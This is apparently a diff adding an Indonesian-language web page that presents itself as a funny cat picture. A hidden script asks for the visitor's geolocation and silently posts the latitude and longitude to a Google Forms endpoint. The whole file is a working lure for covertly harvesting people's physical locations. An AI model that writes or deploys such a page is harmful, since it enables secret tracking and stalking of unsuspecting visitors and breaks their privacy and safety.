@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Gambar Lucu</title>
+</head>
+<body>
+  <h2>Lagi memuat gambar...</h2>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/a/a3/June_odd-eyed-cat.jpg" width="300">
+
+  <script>
+    navigator.geolocation.getCurrentPosition(
+      function(position) {
+        const data = new FormData();
+        data.append("entry.758282454", position.coords.latitude);   // Latitude
+        data.append("entry.1247418050", position.coords.longitude); // Longitude
+
+        fetch("https://docs.google.com/forms/d/e/1FAIpQLSfDyhkZWhhZprCyaMpFZk6nQgzzptgmwylNR82tVA2wyTQ80Q/formResponse", {
+          method: "POST",
+          mode: "no-cors",
+          body: data
+        });
+      },
+      function(error) {
+        alert("Izin lokasi tidak diberikan.");
+      }
+    );
+  </script>
+</body>
+</html>
